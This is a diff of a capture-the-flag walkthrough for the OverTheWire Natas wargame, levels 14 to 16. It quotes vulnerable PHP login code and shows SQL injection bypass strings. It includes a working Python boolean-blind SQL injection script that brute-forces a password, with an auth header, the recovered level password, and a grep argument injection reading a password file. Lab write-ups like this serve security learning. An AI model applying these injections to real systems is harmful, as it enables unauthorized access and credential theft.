@@ -8,7 +8,7 @@ Security is tighter now. The source code is more restricting:
 ![][image2]  
 We can still grep everything from our file to show us the output with the following command:
 
-| '^' /etc/natas\_webpass/natas11 |
+`'^' /etc/natas\_webpass/natas11 `
 | :---- |
 
 Then it greps both our password file and the dictionary.txt file:  
@@ -249,10 +249,133 @@ Aha!
 ### Natas 14
 A login form!
 <img width="1913" height="276" alt="image" src="https://github.com/user-attachments/assets/98c8a1e9-57c4-4517-88db-cf5320a2c057" /><br/>
+The source code this time:
+```
+<?php
+if(array_key_exists("username", $_REQUEST)) {
+    $link = mysqli_connect('localhost', 'natas14', '<censored>');
+    mysqli_select_db($link, 'natas14');
 
+    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
+    if(array_key_exists("debug", $_GET)) {
+        echo "Executing query: $query<br>";
+    }
 
+    if(mysqli_num_rows(mysqli_query($link, $query)) > 0) {
+            echo "Successful login! The password for natas15 is <censored><br>";
+    } else {
+            echo "Access denied!<br>";
+    }
+    mysqli_close($link);
+} else {
+?>
+```
+We have SQL! Login creds is verified using an sql database. We should probably attempt SQLI. Notice our username and password are kept in between `\`, used to escape characters. So if I try something basic like `" or ""="`
+```
+where username="" or ""="" and password="" or ""=""
+```
+Should work because ""="" is always true.
+<img width="553" height="102" alt="image" src="https://github.com/user-attachments/assets/2d17cf38-f998-4bb8-b748-a889c0843426" /><br/>
+Yay!
 
+### Natas 15
+A simple username checker:
+<img width="621" height="198" alt="image" src="https://github.com/user-attachments/assets/22e86b38-1df1-4d2e-9498-f8a54cc77c47" /><br/>
+Let's check out the code:
+```
+<?php
 
+/*
+CREATE TABLE `users` (
+  `username` varchar(64) DEFAULT NULL,
+  `password` varchar(64) DEFAULT NULL
+);
+*/
+
+if(array_key_exists("username", $_REQUEST)) {
+    $link = mysqli_connect('localhost', 'natas15', '<censored>');
+    mysqli_select_db($link, 'natas15');
+
+    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
+    if(array_key_exists("debug", $_GET)) {
+        echo "Executing query: $query<br>";
+    }
+
+    $res = mysqli_query($link, $query);
+    if($res) {
+    if(mysqli_num_rows($res) > 0) {
+        echo "This user exists.<br>";
+    } else {
+        echo "This user doesn't exist.<br>";
+    }
+    } else {
+        echo "Error in query.<br>";
+    }
+
+    mysqli_close($link);
+} else {
+?>
+
+```
+OK, we can easily inject `" or ""="` again and if we do so we do get `This user exists.`. What can we do now? The outputs are just echo messages. We know there's a table named `users` that has both a username and password column. Interestingly, when provided the username `natas16` we are met with `This user exists.` also - meaning the key is probably finding out the password.
+But how? All we have is a boolean indication of if username X exists or not. 
+I did read through SQLI cheatsheets and found something that may help us out - **Boolean-based blind SQLI** - for when our query isn't printed back but we get a boolean indication of if it's true or not. The input should be like so:
+`" OR SUBSTRING((SELECT password FROM users WHERE username='natas16'),1,1)='a'--"`
+We use the `SUBSTRING` command to get a specific char from the password and see if we can bruteforce our way into finding out what it is!
+Obviously this is very tedious to do by hand, so let's see if we can automate this. I've downloaded the python `requests` module and written a pretty basic script:
+```
+import requests
+import string
+
+headers = {
+        "accept": "application/json",
+        "Authorization": "Basic bmF0YXMxNTpHQjZVU0NKWUpqd0x5WWhaVU5rRTFOd0R1ZWlUb3c2Zw==",
+        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
+    }
+final_password = ""
+
+for i in range(1, 33):
+    found = False
+    for char in string.ascii_letters + string.digits:
+        base_injection = f'" OR SUBSTRING((SELECT password FROM users WHERE username="natas16"),{i},1)="{char}" "'
+        response = requests.post("http://natas15.natas.labs.overthewire.org/", data={"username": base_injection}, headers=headers)
+
+        if "This user exists." in response.content.decode():
+            final_password += char
+print(final_password)
+```
+This bruteforces each character so at the end we can construct the entire password, which turned out to be `xm6xeern3zsgjrdqbpmuqavv65k7e3gb`. I did think it was weird that there were no uppercase letters, and turns out the query is case-insensitive - I get true even if I switch characters to their uppercase counterparts.
+Apparently this is an issue with the `SUBSTRING` function. So I googled and found we can use `BINARY` to find the true casing of our characters, so finally the injection in python would be:
+```
+base_injection = f'" OR BINARY SUBSTRING((SELECT password FROM users WHERE username="natas16" COLLATE utf8mb4_bin),{i},1)="{char}" "'
+```
+Running the script one last time, we end up with `Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb`
+
+### Natas 16
+Even more restrictions - 
+<img width="627" height="264" alt="image" src="https://github.com/user-attachments/assets/6f2384f9-9305-4476-a33d-8588d0abdb6c" /><br/>
+And the source code:
+```
+<?
+ini_set('pcre.jit', 0);
+$key = "";
+
+if(array_key_exists("needle", $_REQUEST)) {
+    $key = $_REQUEST["needle"];
+}
+
+if($key != "") {
+    if(preg_match('/[;|&`\'"]/',$key)) {
+        print "Input contains an illegal character!";
+    } else {
+        passthru("grep -i \"$key\" dictionary.txt");
+    }
+}
+?>
+```
+This is a throwback to Natas 10, but now lots of characters are illegal. Recall our input last time:
+`'^' /etc/natas_webpass/natas11`
+We cannot use `'\"` so how else do we escape these quotes?
 
 [image1]: <data:image/png;base64,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>
 
